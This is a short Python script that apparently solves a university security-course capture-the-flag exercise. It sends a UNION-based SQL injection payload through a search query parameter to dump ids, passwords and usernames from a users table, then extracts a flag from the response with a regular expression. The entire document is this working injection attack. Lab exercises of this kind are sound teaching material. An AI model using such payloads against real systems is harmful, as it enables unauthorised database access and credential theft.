import requests
import re

s = requests.Session()
injection = ' \" AND 1 = 0 UNION SELECT id, password, username FROM tumoogleplus_users -- '
# Be careful, the colons can be different!

p = s.get("https://t4.itsec.sec.in.tum.de/?q="+ injection)

print(re.search(r'flag\{[^}]+}', p.text))
